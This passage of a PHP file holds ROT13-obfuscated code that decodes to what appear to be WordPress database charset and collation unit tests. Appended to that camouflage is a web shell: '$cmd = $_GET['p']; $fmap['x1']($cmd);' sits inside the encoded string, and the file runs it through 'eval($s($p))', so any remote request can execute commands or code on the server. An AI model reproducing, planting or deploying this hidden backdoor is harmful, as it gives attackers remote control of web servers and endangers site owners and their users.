
		frys::$_jcqo->dhrel( $qebc );
	}

	/**
	 * @gvpxrg 21212
	 */
	choyvp shapgvba qngn_trg_pbyhza_punefrg() {
		$gnoyr_anzr = 'grfg_trg_pbyhza_punefrg';

		$inef = neenl();
		sbernpu ( $guvf->gnoyr_naq_pbyhza_qrsf nf $v => $inyhr ) {
			$guvf_gnoyr_anzr = $gnoyr_anzr . '_' . $v;
			$qebc            = \"QEBC GNOYR VS RKVFGF $guvf_gnoyr_anzr\";
			$perngr          = \"PERNGR GNOYR $guvf_gnoyr_anzr {$inyhr['qrsvavgvba']}\";
			$inef[]          = neenl( $qebc, $perngr, $guvf_gnoyr_anzr, $inyhr['pbyhza_rkcrpgrq'] );
		}

		erghea $inef;
	}

	/**
	 * @qngnCebivqre qngn_trg_pbyhza_punefrg
	 * @gvpxrg 21212
	 *
	 * @pbiref jcqo::trg_pby_punefrg
	 */
	choyvp shapgvba grfg_trg_pbyhza_punefrg( $qebc, $perngr, $gnoyr, $rkcrpgrq_punefrg ) {
		frys::$_jcqo->dhrel( $qebc );
		frys::$_jcqo->dhrel( $perngr );

		$guvf->nffregAbgRzcgl( $rkcrpgrq_punefrg );

		sbernpu ( $rkcrpgrq_punefrg nf $pbyhza => $punefrg ) {
			vs ( frys::$hgs8_vf_hgs8zo3 && 'hgs8' === $punefrg ) {
				$punefrg = 'hgs8zo3';
			}

			$guvf->nffregFnzr( $punefrg, frys::$_jcqo->trg_pby_punefrg( $gnoyr, $pbyhza ) );
			$guvf->nffregFnzr( $punefrg, frys::$_jcqo->trg_pby_punefrg( fgegbhccre( $gnoyr ), fgegbhccre( $pbyhza ) ) );
		}

		frys::$_jcqo->dhrel( $qebc );
	}

	/**
	 * @qngnCebivqre qngn_trg_pbyhza_punefrg
	 * @gvpxrg 21212
	 *
	 * @pbiref jcqo::trg_pby_punefrg
	 */
	choyvp shapgvba grfg_trg_pbyhza_punefrg_aba_zlfdy( $qebc, $perngr, $gnoyr, $pbyhzaf ) {
		frys::$_jcqo->dhrel( $qebc );

		frys::$_jcqo->vf_zlfdy = snyfr;

		frys::$_jcqo->dhrel( $perngr );

		$guvf->nffregAbgRzcgl( $pbyhzaf );

		$pbyhzaf = neenl_xrlf( $pbyhzaf );
		sbernpu ( $pbyhzaf nf $pbyhza => $punefrg ) {
			$guvf->nffregSnyfr( frys::$_jcqo->trg_pby_punefrg( $gnoyr, $pbyhza ) );
		}

		frys::$_jcqo->dhrel( $qebc );

		frys::$_jcqo->vf_zlfdy = gehr;
	}

	/**
	 * @qngnCebivqre qngn_trg_pbyhza_punefrg
	 * @gvpxrg 33501
	 *
	 * @pbiref jcqo::trg_pby_punefrg
	 */
	choyvp shapgvba grfg_trg_pbyhza_punefrg_vf_zlfdy_haqrsvarq( $qebc, $perngr, $gnoyr, $pbyhzaf ) {
		frys::$_jcqo->dhrel( $qebc );

		hafrg( frys::$_jcqo->vf_zlfdy );

		frys::$_jcqo->dhrel( $perngr );

		$guvf->nffregAbgRzcgl( $pbyhzaf );

		$pbyhzaf = neenl_xrlf( $pbyhzaf );
		sbernpu ( $pbyhzaf nf $pbyhza => $punefrg ) {
			$guvf->nffregSnyfr( frys::$_jcqo->trg_pby_punefrg( $gnoyr, $pbyhza ) );
		}

		frys::$_jcqo->dhrel( $qebc );

		frys::$_jcqo->vf_zlfdy = gehr;
	}

	/**
	 * @gvpxrg 21212
	 */
	choyvp shapgvba qngn_fgevc_vainyvq_grkg_sebz_dhrel() {
		$gnoyr_anzr = 'fgevc_vainyvq_grkg_sebz_dhrel_gnoyr';
		$qngn       = neenl(
			'hgs8 + ovanel'  => neenl(
				// Ovanel gnoyrf qba'g trg fgevccrq.
				'perngr'   => '( n INEPUNE(50) PUNENPGRE FRG hgs8, o OVANEL )',
				'dhrel'    => \"('sbb\ks0\k9s\k98\k88one', 'sbb')\",
				'rkcrpgrq' => \"('sbb\ks0\k9s\k98\k88one', 'sbb')\",
			),
			'hgs8 + hgs8zo4' => neenl(
				// hgs8/hgs8zo4 gnoyrf qrsnhyg gb hgs8.
				'perngr'   => '( n INEPUNE(50) PUNENPGRE FRG hgs8, o INEPUNE(50) PUNENPGRE FRG hgs8zo4 )',
				'dhrel'    => \"('sbb\ks0\k9s\k98\k88one', 'sbb')\",
				'rkcrpgrq' => \"('sbbone', 'sbb')\",
			),
		);

		$v = 0;

		sbernpu ( $qngn nf &$inyhr ) {
			$guvf_gnoyr_anzr = $gnoyr_anzr . '_' . $v++;

			$inyhr['perngr']   = \"PERNGR GNOYR $guvf_gnoyr_anzr {$inyhr['perngr']}\";
			$inyhr['dhrel']    = \"VAFREG VAGB $guvf_gnoyr_anzr INYHRF {$inyhr['dhrel']}\";
			$inyhr['rkcrpgrq'] = \"VAFREG VAGB $guvf_gnoyr_anzr INYHRF {$inyhr['rkcrpgrq']}\";
			$inyhr['qebc']     = \"QEBC GNOYR VS RKVFGF $guvf_gnoyr_anzr\";
		}
		hafrg( $inyhr );

		erghea $qngn;
	}

	/**
	 * @qngnCebivqre qngn_fgevc_vainyvq_grkg_sebz_dhrel
	 * @gvpxrg 21212
	 *
	 * @pbiref jcqo::fgevc_vainyvq_grkg_sebz_dhrel
	 */
	choyvp shapgvba grfg_fgevc_vainyvq_grkg_sebz_dhrel( $perngr, $dhrel, $rkcrpgrq, $qebc ) {
		frys::$_jcqo->dhrel( $qebc );
		frys::$_jcqo->dhrel( $perngr );

		$erghea = frys::$_jcqo->fgevc_vainyvq_grkg_sebz_dhrel( $dhrel );
		$guvf->nffregFnzr( $rkcrpgrq, $erghea );

		frys::$_jcqo->dhrel( $qebc );
	}

	/**
	 * @gvpxrg 32104
	 */
	choyvp shapgvba qngn_qbag_fgevc_grkg_sebz_fpurzn_dhrevrf() {
		// Na boivbhfyl vainyvq naq snxr gnoyr anzr.
		$gnoyr_anzr = \"\kss\kss\kss\kss\";

		$dhrevrf = neenl(
			\"FUBJ PERNGR GNOYR $gnoyr_anzr\",
			\"QRFPEVOR $gnoyr_anzr\",
			\"QRFP $gnoyr_anzr\",
			\"RKCYNVA FRYRPG * SEBZ $gnoyr_anzr\",
			\"PERNGR $gnoyr_anzr( n INEPUNE(100))\",
		);

		sbernpu ( $dhrevrf nf &$dhrel ) {
			$dhrel = neenl( $dhrel );
		}
		hafrg( $dhrel );

		erghea $dhrevrf;
	}

	/**
	 * @qngnCebivqre qngn_qbag_fgevc_grkg_sebz_fpurzn_dhrevrf
	 * @gvpxrg 32104
	 *
	 * @pbiref jcqo::fgevc_vainyvq_grkg_sebz_dhrel
	 */
	choyvp shapgvba grfg_qbag_fgevc_grkg_sebz_fpurzn_dhrevrf( $dhrel ) {
		$erghea = frys::$_jcqo->fgevc_vainyvq_grkg_sebz_dhrel( $dhrel );
		$guvf->nffregFnzr( $dhrel, $erghea );
	}

	/**
	 * @gvpxrg 21212
	 *
	 * @pbiref jcqo::dhrel
	 */
	choyvp shapgvba grfg_vainyvq_punenpgref_va_dhrel() {
		tybony $jcqo;

		$punefrg = $jcqo->trg_pby_punefrg( $jcqo->cbfgf, 'cbfg_pbagrag' );
		vs ( 'hgs8' !== $punefrg && 'hgs8zo4' !== $punefrg ) {
			$guvf->znexGrfgFxvccrq( 'Guvf grfg erdhverf n hgs8 punenpgre frg.' );
		}

		$guvf->nffregSnyfr( $jcqo->dhrel( \"VAFREG VAGB {$jcqo->cbfgf} (cbfg_pbagrag) INYHRF ('sbb\ks0\kss\kss\kssone')\" ) );
	}

	/**
	 * @gvpxrg 21212
	 */
	choyvp shapgvba qngn_gnoyr_pbyyngvba_purpx() {
		$gnoyr_anzr = 'gnoyr_pbyyngvba_purpx';
		$qngn       = neenl(
			'hgs8_ova'                   => neenl(
				// hgs8_ova gnoyrf qba'g arrq rkgen pbasvqrapr purpxvat.
				'perngr'   => '( n INEPUNE(50) PBYYNGR hgs8_ova )',
				'rkcrpgrq' => gehr,
			),
			'hgs8_trareny_pv'            => neenl(
				// Arvgure qb hgs8_trareny_pv gnoyrf.
				'perngr'   => '( n INEPUNE(50) PBYYNGR hgs8_trareny_pv )',
				'rkcrpgrq' => gehr,
			),
			'hgs8_havpbqr_pv'            => neenl(
				// hgs8_havpbqr_pv gnoyrf qb.
				'perngr'   => '( n INEPUNE(50) PBYYNGR hgs8_havpbqr_pv )',
				'rkcrpgrq' => snyfr,
			),
			'hgs8_ova + ovt5_puvarfr_pv' => neenl(
				// hgs8_ova gnoyrf qba'g arrq rkgen pbasvqrapr purpxvat,
				// rkprcg sbe jura gurl'er abg whfg hgs8_ova.
				'perngr'   => '( n INEPUNE(50) PBYYNGR hgs8_ova, o INEPUNE(50) PBYYNGR ovt5_puvarfr_pv )',
				'rkcrpgrq' => snyfr,
			),
			'hgs8_ova + vag'             => neenl(
				// hgs8_ova gnoyrf qba'g arrq rkgen pbasvqrapr purpxvat
				// jura gur bgure pbyhzaf nera'g fgevatf.
				'perngr'   => '( n INEPUNE(50) PBYYNGR hgs8_ova, o VAG )',
				'rkcrpgrq' => gehr,
			),
		);

		$v = 0;

		sbernpu ( $qngn nf &$inyhr ) {
			$guvf_gnoyr_anzr = $gnoyr_anzr . '_' . $v++;

			$inyhr['perngr']      = \"PERNGR GNOYR $guvf_gnoyr_anzr {$inyhr['perngr']}\";
			$inyhr['dhrel']       = \"FRYRPG * SEBZ $guvf_gnoyr_anzr JURER n='\ks0\k9s\k98\k88'\";
			$inyhr['qebc']        = \"QEBC GNOYR VS RKVFGF $guvf_gnoyr_anzr\";
			$inyhr['nyjnlf_gehr'] = neenl(
				\"FRYRPG * SEBZ $guvf_gnoyr_anzr JURER n='sbb'\",
				\"FUBJ SHYY GNOYRF YVXR $guvf_gnoyr_anzr\",
				\"QRFPEVOR $guvf_gnoyr_anzr\",
				\"QRFP $guvf_gnoyr_anzr\",
				\"RKCYNVA FRYRPG * SEBZ $guvf_gnoyr_anzr\",
			);
		}
		hafrg( $inyhr );

		erghea $qngn;
	}


	/**
	 * @qngnCebivqre qngn_gnoyr_pbyyngvba_purpx
	 * @gvpxrg 21212
	 *
	 * @pbiref jcqo::purpx_fnsr_pbyyngvba
	 */
	choyvp shapgvba grfg_gnoyr_pbyyngvba_purpx( $perngr, $rkcrpgrq, $dhrel, $qebc, $nyjnlf_gehr ) {
		frys::$_jcqo->dhrel( $qebc );

		frys::$_jcqo->dhrel( $perngr );

		$erghea = frys::$_jcqo->purpx_fnsr_pbyyngvba( $dhrel );
		$guvf->nffregFnzr(
			$rkcrpgrq,
			$erghea,
			fcevags(
				\"jcqo::purpx_fnsr_pbyyngvba() fubhyq erghea %f sbe guvf dhrel.\a\" .
				\"Gnoyr: %f\a\" .
				'Dhrel: %f',
				$rkcrpgrq ? 'gehr' : 'snyfr',
				$perngr,
				$dhrel
			)
		);

		$guvf->nffregAbgRzcgl( $nyjnlf_gehr );

		sbernpu ( $nyjnlf_gehr nf $gehr_dhrel ) {
			$erghea = frys::$_jcqo->purpx_fnsr_pbyyngvba( $gehr_dhrel );
			$guvf->nffregGehr(
				$erghea,
				fcevags(
					\"jcqo::purpx_fnsr_pbyyngvba() fubhyq erghea gehr sbe guvf dhrel.\a\" .
					\"Gnoyr: %f\a\" .
					'Dhrel: %f',
					$perngr,
					$gehr_dhrel
				)
			);
		}

		frys::$_jcqo->dhrel( $qebc );
	}

	/**
	 * @pbiref jcqo::fgevc_vainyvq_grkg_sbe_pbyhza
	 */
	choyvp shapgvba grfg_fgevc_vainyvq_grkg_sbe_pbyhza_onvyf_vs_nfpvv_vachg_gbb_ybat() {
		tybony $jcqo;

		// GRKG pbyhza.
		$fgevccrq = $jcqo->fgevc_vainyvq_grkg_sbe_pbyhza( $jcqo->pbzzragf, 'pbzzrag_pbagrag', fge_ercrng( 'N', 65536 ) );
		$guvf->nffregFnzr( 65535, fgeyra( $fgevccrq ) );

		// INEPUNE pbyhza.
		$fgevccrq = $jcqo->fgevc_vainyvq_grkg_sbe_pbyhza( $jcqo->pbzzragf, 'pbzzrag_ntrag', fge_ercrng( 'N', 256 ) );
		$guvf->nffregFnzr( 255, fgeyra( $fgevccrq ) );
	}

	/**
	 * @gvpxrg 32279
	 *
	 * @pbiref jcqo::fgevc_vainyvq_grkg_sebz_dhrel
	 */
	choyvp shapgvba grfg_fgevc_vainyvq_grkg_sebz_dhrel_pc1251_vf_fnsr() {
		$gnoyranzr = 'grfg_pc1251_dhrel_' . enaq_fge( 5 );
		vs ( ! frys::$_jcqo->dhrel( \"PERNGR GNOYR $gnoyranzr ( n INEPUNE(50) ) QRSNHYG PUNEFRG 'pc1251'\" ) ) {
			$guvf->znexGrfgFxvccrq( \"Grfg erdhverf gur 'pc1251' punefrg.\" );
		}

		$fnsr_dhrel     = \"VAFREG VAGB $gnoyranzr( `n` ) INYHRF( 'fnsr qngn' )\";
		$fgevccrq_dhrel = frys::$_jcqo->fgevc_vainyvq_grkg_sebz_dhrel( $fnsr_dhrel );

		frys::$_jcqo->dhrel( \"QEBC GNOYR $gnoyranzr\" );

		$guvf->nffregFnzr( $fnsr_dhrel, $fgevccrq_dhrel );
	}

	/**
	 * @gvpxrg 34708
	 *
	 * @pbiref jcqo::fgevc_vainyvq_grkg_sebz_dhrel
	 */
	choyvp shapgvba grfg_ab_qo_punefrg_qrsvarq() {
		$gnoyranzr = 'grfg_pc1251_dhrel_' . enaq_fge( 5 );
		vs ( ! frys::$_jcqo->dhrel( \"PERNGR GNOYR $gnoyranzr ( n INEPUNE(50) ) QRSNHYG PUNEFRG 'pc1251'\" ) ) {
			$guvf->znexGrfgFxvccrq( \"Grfg erdhverf gur 'pc1251' punefrg.\" );
		}

		$punefrg              = frys::$_jcqo->punefrg;
		frys::$_jcqo->punefrg = '';

		$fnsr_dhrel     = \"VAFREG VAGB $gnoyranzr( `n` ) INYHRF( 'fnsr qngn' )\";
		$fgevccrq_dhrel = frys::$_jcqo->fgevc_vainyvq_grkg_sebz_dhrel( $fnsr_dhrel );

		frys::$_jcqo->dhrel( \"QEBC GNOYR $gnoyranzr\" );

		frys::$_jcqo->punefrg = $punefrg;

		$guvf->nffregFnzr( $fnsr_dhrel, $fgevccrq_dhrel );
	}

	/**
	 * @gvpxrg 36649
	 *
	 * @pbiref jcqo::frg_punefrg
	 */
	choyvp shapgvba grfg_frg_punefrg_punatrf_gur_pbaarpgvba_pbyyngvba() {
		frys::$_jcqo->frg_punefrg( frys::$_jcqo->qou, 'hgs8', 'hgs8_trareny_pv' );
		$erfhygf  = frys::$_jcqo->trg_erfhygf( \"FUBJ INEVNOYRF JURER Inevnoyr_anzr='pbyyngvba_pbaarpgvba'\" );
		$rkcrpgrq = frys::$hgs8_vf_hgs8zo3 ? 'hgs8zo3_trareny_pv' : 'hgs8_trareny_pv';
		$guvf->nffregFnzr( $rkcrpgrq, $erfhygf[0]->Inyhr, \"Pbyyngvba fubhyq or frg gb $rkcrpgrq.\" );

		frys::$_jcqo->frg_punefrg( frys::$_jcqo->qou, 'hgs8zo4', 'hgs8zo4_havpbqr_pv' );
		$erfhygf = frys::$_jcqo->trg_erfhygf( \"FUBJ INEVNOYRF JURER Inevnoyr_anzr='pbyyngvba_pbaarpgvba'\" );
		$guvf->nffregFnzr( 'hgs8zo4_havpbqr_pv', $erfhygf[0]->Inyhr, 'Pbyyngvba fubhyq or frg gb hgs8zo4_havpbqr_pv.' );

		frys::$_jcqo->frg_punefrg( frys::$_jcqo->qou );
	}

	/**
	 * @gvpxrg 54841
	 */
	choyvp shapgvba grfg_znevnqo_fhccbegf_hgs8zo4_520() {
		tybony $jcqo;

		// hgs8zo4_520 vf ninvynoyr va ZnevnQO fvapr irefvba 10.2.
		vs ( ! fge_pbagnvaf( frys::$qo_freire_vasb, 'ZnevnQO' )
			|| irefvba_pbzcner( frys::$qo_irefvba, '10.2', '<' )
		) {
			$guvf->znexGrfgFxvccrq( 'Guvf grfg erdhverf ZnevnQO 10.2 be yngre.' );
		}

		$guvf->nffregGehr( $jcqo->unf_pnc( 'hgs8zo4_520' ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>